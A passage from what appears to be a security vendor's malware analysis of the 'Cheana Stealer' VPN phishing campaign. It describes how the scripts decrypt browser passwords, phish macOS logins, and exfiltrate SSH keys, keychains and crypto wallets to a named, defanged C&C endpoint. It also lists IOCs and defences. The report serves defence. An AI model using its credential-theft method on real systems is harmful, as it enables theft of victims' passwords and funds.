<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading"><strong>Targeting Browser passwords</strong>&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Additionally, the malicious Python module targets browser passwords stored in an SQLite database called "<em>Login Data." </em>For Chromium-based browsers, the script first enumerates and retrieves the names of all files within the “<em>Browser-name\User Data\</em>” directory. It specifically looks for the "<em>Local State</em>" file, which holds the encrypted key necessary for decryption. The script then utilizes the “<em>CryptUnprotectData()”&nbsp;</em> function to decrypt this key. With the decrypted key, the script can subsequently decrypt the "Login Data" file, which contains all user credentials. This process allows the attackers to access and exfiltrate saved passwords from the targeted browsers.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56947,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Targets Browsers Password " class="wp-image-56947" src="https://cyble.com/wp-content/uploads/2024/08/Figure-13-Targets-Browsers-Password.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>13</em><em> - Targets Browsers Password</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>For non-Chromium-based browsers like Firefox, the TA employs a module called “<em>ganache.fflg</em>” which is capable of extracting credentials across different platforms, including Windows, Linux, and Mac. In our scenario, the focus is on Windows. The module systematically iterates through all Firefox profiles to collect key files such as “<em>prefs.js</em>”,<em> “logins.json”</em>, and, as a fallback for older versions, “<em>signons.sqlite</em>”. It then leverages the <em>Network Security Services</em> (NSS) library <em>nss3.dll</em> to decrypt and extract the browser credentials in plain text. Once decrypted, the decrypted credentials are exfiltrated from the victim's machine to the TAs command and control (C&amp;C) server.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56948,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Targeting Firefox browser " class="wp-image-56948" src="https://cyble.com/wp-content/uploads/2024/08/Figure-14-Targeting-Firefox-browser.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>14</em><em> - Targeting Firefox browser</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56950,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="nss utility for credential decryption " class="wp-image-56950" src="https://cyble.com/wp-content/uploads/2024/08/Figure-15-nss-utility-for-credential-decryption.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>15</em><em> - nss utility for credential decryption</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading"><strong>Ubuntu/Linux</strong>&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>For Linux, the TA crafted a curl command to download the "install-linux.sh" script from 'hxxps://warpvpn.net' as shown in the below figure.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56951,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt=" Installation instruction for Linux " class="wp-image-56951" src="https://cyble.com/wp-content/uploads/2024/08/Figure-16-–-Installation-instruction-for-Linux.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>16</em><em> – Installation instruction for Linux</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The script “<em>install-linux.sh</em>” first attempts to retrieve a unique ID from the &nbsp;<br />“<em>warpvpn</em>” configuration file located at “~/HOME/.config/warpvpn”. If this file is missing, the script sends a POST request to the server containing the victim’s username, operating system, and the phishing source in order to obtain a unique ID. This ID is then used in all subsequent POST requests, along with the stolen data from the victim's machine.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56952,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Unique ID " class="wp-image-56952" src="https://cyble.com/wp-content/uploads/2024/08/Figure-17-Unique-ID.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>17</em><em> - Unique ID</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The “<em>install-linux.sh” </em>script is divided into two main components: a stealer that gathers sensitive browser information and a cryptocurrency stealer, along with a function designed to mimic the legitimate Cloudflare Warp application installer.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>This Linux module mirrors the Python-based stealing activities observed on Windows systems, targeting browser extensions and cryptocurrency wallets, including Bitcoin and Monero. However, on Linux, the script introduces some notable variations. The bash script is designed to steal Login Data and Cookies files from the victim’s machine and exfiltrate them to C&amp;C server. Furthermore, the script searches for and uploads SSH keys from the “<em>/.ssh</em>” folder, as depicted in the figure below. This comprehensive approach significantly boosts the attacker's ability to gain and maintain unauthorized access to the compromised system.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56953,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="content of install-linux.sh " class="wp-image-56953" src="https://cyble.com/wp-content/uploads/2024/08/Figure-18-–-content-of-install-linux.sh_.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>18</em><em> – content of install-linux.sh</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading"><strong>MacOS</strong>&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>For MacOS, the TA provides similar curl command to download “<em>install.sh</em>” and using default shell “<em>sh</em>” to execute the downloaded script.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56955,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Install instruction for MacOS " class="wp-image-56955" src="https://cyble.com/wp-content/uploads/2024/08/Figure-19-Install-instruction-for-MacOS.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>19</em><em> - Install instruction for MacOS</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading"><strong>Targeting MacOS password:</strong>&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>The script tricks the user into entering their credentials by mimicking a standard system prompt that typically appears during a new application installation, making it appear as a legitimate request. After the user enters their password, the script uses the ‘<em>dscl . -authonly</em>’ command to validate the credentials. If the validation is successful and no errors occur, the credentials, along with data from the “<em>/Library/Keychains</em>” folder, are sent to the attacker's command and control (C&amp;C) server through a ‘curl’ POST request. If the validation fails, the script repeatedly prompts the user to re-enter their credentials, continuing this process until it succeeds.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56956,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="MacOS password exfiltration " class="wp-image-56956" src="https://cyble.com/wp-content/uploads/2024/08/Figure-20-MacOS-password-exfiltration.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>20</em><em> - MacOS password exfiltration</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The TA aimed to gather information similar to what was observed in previous Linux cases. However, there are notable differences in the scope of the attack. In addition to targeting common cryptocurrency wallets like Bitcoin and Monero, the TA also focuses on a broader range of crypto wallets, including Electrum, Exodus, DashCore, and Guarda. Furthermore, the script searches for and exfiltrates saved SSH keys from the `/.ssh` folder.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56957,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt=" install.sh (Crypto wallet exfiltration) " class="wp-image-56957" src="https://cyble.com/wp-content/uploads/2024/08/Figure-21-–-install.sh-Crypto-wallet-exfiltration.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>21</em><em> – install.sh (Crypto wallet exfiltration)</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading"><strong>Fake Message and WarpVPN Installation</strong>&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>During the theft operation, the TA employs a deceptive tactic by displaying a fake “in-progress” message.After successfully exfiltrating the data, the script proceeds to download and install the genuine Cloudflare Warp application on the victim's machine, as shown in the figure below.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56960,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Fake Message and Legitimate VPN Installation " class="wp-image-56960" src="https://cyble.com/wp-content/uploads/2024/08/Figure-22-–-Fake-Message-and-Legitimate-VPN-Installation-1.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>22</em><em> – Fake Message and Legitimate VPN Installation</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading"><strong>Exfiltration over HTTPS&nbsp;</strong>&nbsp;</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Before the exfiltration process, the TA archives the stolen files into ZIP files, ensuring they are organized by data type with distinct archive names for each category. These archives are then transmitted to the attacker's Command and Control (C&amp;C) server via a POST request to “<em>hxxps://ganache.live/api/v1/attachment</em>”. The communication occurs over port 443, allowing the data to be sent securely under the guise of legitimate HTTPS traffic.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56961,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Exfiltration over HTTPS " class="wp-image-56961" src="https://cyble.com/wp-content/uploads/2024/08/Figure-23-Exfiltration-over-HTTPS.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>23</em><em> - Exfiltration over HTTPS</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The TA utilizes a Django Rest Framework-based interface to manage and view the exfiltrated data. This setup provides them with a structured and accessible way to organize and analyze the stolen information, ensuring efficient exploitation of the compromised data.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":56962,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="attacker's login" class="wp-image-56962" src="https://cyble.com/wp-content/uploads/2024/08/Figure-24-attackers-login.png" /></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph {"align":"center"} --></p>
<p class="has-text-align-center"><em>Figure </em><em>24</em><em> - attacker's login</em>&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Conclusion&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>This phishing campaign masquerades as a trustworthy VPN provider. This campaign is spreading from a Telegram channel, carefully cultivating user confidence over time before pivoting to malicious objectives. This Telegram channel boasts over 54,000 subscribers, which has been operational since 2018 and is believed to have undergone a change in operators in 2021.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The campaign’s reach is underscored by its targeting of multiple platforms—Windows, Linux, and macOS—demonstrating a comprehensive approach to malware distribution. By creating distinct malicious scripts tailored for each operating system, the attackers ensure that their payloads are effectively executed across different environments. This multi-platform strategy allows the phishing operation to maximize its reach and impact, compromising a wide array of systems and harvesting sensitive information from a diverse user base.&nbsp;&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Recommendations&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>The initial infiltration is taking place via phishing websites. It is crucial to only download and install software applications from well-known and trusted sources.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Conduct awareness campaigns to educate users about the risks of <a href="https://cyble.com/blog/phishing-attack-trends-captured-by-cyble-honeypots/">phishing attacks</a> and the importance of verifying the authenticity of VPN services. </li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Deploy advanced endpoint protection solutions that can detect and block malicious scripts and payloads across different operating systems. Ensure that these solutions are updated regularly to identify and mitigate new threats.&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Use network security tools to monitor and block communications with known Command and Control (C&amp;C) servers. Implement <a href="https://cyble.com/knowledge-hub/what-is-firewall/">firewalls</a> and intrusion detection systems to detect and prevent unauthorized access.  </li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Enable MFA on all accounts to add an extra layer of security and reduce the risk of unauthorized access even if credentials are compromised.&nbsp;&nbsp;</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Develop and maintain an <a href="https://cyble.com/knowledge-hub/what-is-incident-response/">incident response plan</a> to quickly address and mitigate the impact of malware infections. Regularly test and update the plan to ensure effectiveness.  </li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">MITRE ATT&amp;CK® Techniques&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table class="has-fixed-layout">
<tbody>
<tr>
<td><strong>Tactic</strong>&nbsp;</td>
<td><strong>Technique</strong>&nbsp;</td>
<td><strong>Procedure</strong>&nbsp;</td>
</tr>
<tr>
<td><strong>Initial Access (</strong><a href="https://attack.mitre.org/tactics/TA0001/" rel="noreferrer noopener" target="_blank"><strong>TA0001</strong></a><strong>)</strong>&nbsp;</td>
<td>Phishing (<a href="https://attack.mitre.org/techniques/T1566/" rel="noreferrer noopener" target="_blank">T1566</a>)&nbsp;</td>
<td>This malware reaches users via VPN phishing sites.&nbsp;</td>
</tr>
<tr>
<td><strong>Execution (</strong><a href="https://attack.mitre.org/tactics/TA0002/" rel="noreferrer noopener" target="_blank"><strong>TA0002</strong></a><strong>)</strong>&nbsp;</td>
<td>Windows&nbsp;<br />Command Shell&nbsp;<br />(<a href="https://attack.mitre.org/techniques/T1059/003/" rel="noreferrer noopener" target="_blank">T1059.003</a>)&nbsp;</td>
<td>cmd.exe is used to run commands&nbsp;</td>
</tr>
<tr>
<td><strong>Execution (</strong><a href="https://attack.mitre.org/tactics/TA0002/" rel="noreferrer noopener" target="_blank"><strong>TA0002</strong></a><strong>)</strong>&nbsp;</td>
<td>PowerShell&nbsp;(<a href="https://attack.mitre.org/techniques/T1059/001/" rel="noreferrer noopener" target="_blank">T1059.001</a>)&nbsp;</td>
<td>Invoke-WebRequest is used for downloading batch files&nbsp;</td>
</tr>
<tr>
<td><strong>Execution (</strong><a href="https://attack.mitre.org/tactics/TA0002/" rel="noreferrer noopener" target="_blank"><strong>TA0002</strong></a><strong>)</strong>&nbsp;</td>
<td>Python (<a href="https://attack.mitre.org/techniques/T1059/006/" rel="noreferrer noopener" target="_blank">T1059.006</a>)&nbsp;&nbsp;</td>
<td>Python stealer is used for targeting windows users&nbsp;</td>
</tr>
<tr>
<td><strong>Execution (</strong><a href="https://attack.mitre.org/tactics/TA0002/" rel="noreferrer noopener" target="_blank"><strong>TA0002</strong></a><strong>)</strong>&nbsp;</td>
<td>User Execution (<a href="https://attack.mitre.org/techniques/T1204/" rel="noreferrer noopener" target="_blank">T1204</a>)&nbsp;</td>
<td>User is instructed to execute the commands&nbsp;</td>
</tr>
<tr>
<td><strong>Credential Access (</strong><a href="https://attack.mitre.org/tactics/TA0006/" rel="noreferrer noopener" target="_blank"><strong>TA0006</strong></a><strong>)</strong>&nbsp;</td>
<td>Credentials from Password Stores: Credentials from Web Browsers (<a href="https://attack.mitre.org/techniques/T1555/003/" rel="noreferrer noopener" target="_blank">T1555.003</a>)&nbsp;</td>
<td>Retrieves passwords from Login Data&nbsp;&nbsp;</td>
</tr>
<tr>
<td><strong>Credential Access (</strong><a href="https://attack.mitre.org/tactics/TA0006/" rel="noreferrer noopener" target="_blank"><strong>TA0006</strong></a><strong>)</strong>&nbsp;</td>
<td>Credentials from Password Stores: Keychain&nbsp;(<a href="https://attack.mitre.org/techniques/T1555/001/" rel="noreferrer noopener" target="_blank">T1555.001</a>)&nbsp;</td>
<td>Attempts to exfiltrate &nbsp;<br />Keychains from MacOS system&nbsp;</td>
</tr>
<tr>
<td><strong>Credential Access (</strong><a href="https://attack.mitre.org/tactics/TA0006/" rel="noreferrer noopener" target="_blank"><strong>TA0006</strong></a><strong>)</strong>&nbsp;</td>
<td>Steal Web Session Cookie&nbsp;(<a href="https://attack.mitre.org/techniques/T1539/" rel="noreferrer noopener" target="_blank">T1539</a>)&nbsp;</td>
<td>Steals browser cookies&nbsp;</td>
</tr>
<tr>
<td><strong>Collection (</strong><a href="https://attack.mitre.org/tactics/TA0009/" rel="noreferrer noopener" target="_blank"><strong>TA0009</strong></a><strong>), Credential Access (</strong><a href="https://attack.mitre.org/tactics/TA0006/" rel="noreferrer noopener" target="_blank"><strong>TA0006</strong></a><strong>)</strong>&nbsp;</td>
<td>Input Capture: GUI Input Capture (<a href="https://attack.mitre.org/techniques/T1056/002/" rel="noreferrer noopener" target="_blank">T1056.002</a>)&nbsp;&nbsp;</td>
<td>Shows command window to enter password on MacOS&nbsp;</td>
</tr>
<tr>
<td><strong>Credential Access (</strong><a href="https://attack.mitre.org/tactics/TA0006/" rel="noreferrer noopener" target="_blank"><strong>TA0006</strong></a><strong>)</strong>&nbsp;</td>
<td>Unsecured Credentials: Private Keys&nbsp;(<a href="https://attack.mitre.org/techniques/T1552/004/" rel="noreferrer noopener" target="_blank">T1552.004</a>)&nbsp;</td>
<td>Tried to exfiltrate ssh keys&nbsp;</td>
</tr>
<tr>
<td><strong>Collection (</strong><a href="https://attack.mitre.org/tactics/TA0009/" rel="noreferrer noopener" target="_blank"><strong>TA0009</strong></a><strong>)</strong>&nbsp;</td>
<td>Archive via Utility&nbsp;(<a href="https://attack.mitre.org/techniques/T1560/001/" rel="noreferrer noopener" target="_blank">T1560.001</a>)&nbsp;</td>
<td>Zip utility is used to compress the data before exfiltration&nbsp;</td>
</tr>
<tr>
<td><strong>Collection (</strong><a href="https://attack.mitre.org/tactics/TA0009/" rel="noreferrer noopener" target="_blank"><strong>TA0009</strong></a><strong>)</strong>&nbsp;</td>
<td>Archive via Library (<a href="https://attack.mitre.org/techniques/T1560/002/" rel="noreferrer noopener" target="_blank">T1560.002</a>)&nbsp;&nbsp;</td>
<td>Zip library is used to compress the data before exfiltration&nbsp;</td>
</tr>
<tr>
<td><strong>Exfiltration (</strong><a href="https://attack.mitre.org/tactics/TA0010/" rel="noreferrer noopener" target="_blank"><strong>TA0010</strong></a><strong>)</strong>&nbsp;</td>
<td>Exfiltration Over C2 Channel (<a href="https://attack.mitre.org/techniques/T1041/" rel="noreferrer noopener" target="_blank">T1041</a>)&nbsp;&nbsp;</td>
<td>Exfiltration Over C2 Channel&nbsp;&nbsp;</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Indicators Of Compromise&nbsp;</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table class="has-fixed-layout">
<tbody>
<tr>
<td><strong>Indicators</strong><strong> </strong>&nbsp;</td>
<td><strong>Indicator Type</strong>&nbsp;</td>
<td><strong>Description</strong>&nbsp;</td>
</tr>
<tr>
<td>70f08497d7a9e6a8e5f2dd3683a20563d20668e1c78df636ff1e36a014c9d493&nbsp;</td>
<td>SHA-256&nbsp;</td>
<td>install-linux.sh&nbsp;</td>
</tr>
<tr>
<td>acf807def82c4b56752a9fa9b081dbb37ba9cc9f6e1c522568ff502b6b49b6db&nbsp;</td>
<td>SHA-256&nbsp;</td>
<td>install.bat&nbsp;</td>
</tr>
<tr>
<td>48964c11fcbefd6508164239866c94b55ca2798e9745671c37447ad0a6f3e1c4&nbsp;</td>
<td>SHA-256&nbsp;</td>
<td>install.sh&nbsp;</td>
</tr>
<tr>
<td>d3ece8616d0dd8244666af574cc2475d947180ed240f49b1a6e61443a896f65d&nbsp;</td>
<td>SHA-256&nbsp;</td>
<td>main.zip&nbsp;</td>
</tr>
<tr>
<td>3ef838502663c167f5c502585e810ffae3e03152b3f82544b813389c19a33dce&nbsp;</td>
<td>SHA-256&nbsp;</td>
<td>main.py&nbsp;</td>
</tr>
<tr>
<td>ac4aeab3952f6ca960cbd48c3123f09a68f50818f9bdf35c9d811570893fa102&nbsp;</td>
<td>SHA-256&nbsp;</td>
<td>fflg.py&nbsp;</td>
</tr>
<tr>
<td>6a68e95ae67aa8c61bd74ecf5f57f98fbdc0bbe0489ae71b7c8732edf49ac3a9&nbsp;</td>
<td>SHA-256&nbsp;</td>
<td>helperwd.py&nbsp;</td>
</tr>
<tr>
<td>c044b1a36249f6fe7219e6c48270d9927bf359110ff3583129dcbdff809f2d2d&nbsp;</td>
<td>SHA-256&nbsp;</td>
<td>utils.py&nbsp;</td>
</tr>
<tr>
<td>ba8058b704a55e50c24383a765fd74b38d7dbbf8546c4f179266c265403174b8&nbsp;</td>
<td>SHA-256&nbsp;</td>
<td>Warpvpn.zip&nbsp;</td>
</tr>
<tr>
<td>warpvpn.net&nbsp;</td>
<td>Domain&nbsp;</td>
<td>Phishing site&nbsp;</td>
</tr>
<tr>
<td>hxxps://ganache.live&nbsp;</td>
<td>Domain&nbsp;</td>
<td>C&amp;C&nbsp;</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p>The post <a href="https://cyble.com/blog/new-cheana-stealer-targets-vpn-user/" rel="nofollow">New Cheana Stealer Targets VPN Users Across Multiple Operating Systems</a> appeared first on <a href="https://cyble.com" rel="nofollow">Cyble</a>.</p>
]]></content:encoded>
<pubDate>Thu, 22 Aug 2024 16:38:23 +0000</pubDate>
</item>
</channel>
</rss>